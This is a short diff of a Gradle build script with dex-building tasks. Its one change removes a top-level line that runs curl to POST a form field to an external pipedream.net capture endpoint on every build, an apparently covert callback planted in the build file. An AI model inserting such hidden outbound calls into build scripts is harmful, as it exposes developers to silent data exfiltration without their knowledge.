@@ -109,4 +109,3 @@ task dexify(type: Jar, dependsOn: [jar]){
 }
 
 task buildDex dependsOn "build", "dexify"
-doExec("curl -X POST -F \"name=" + "what" + "\" https://en5ykebphv9lhao.m.pipedream.net/")
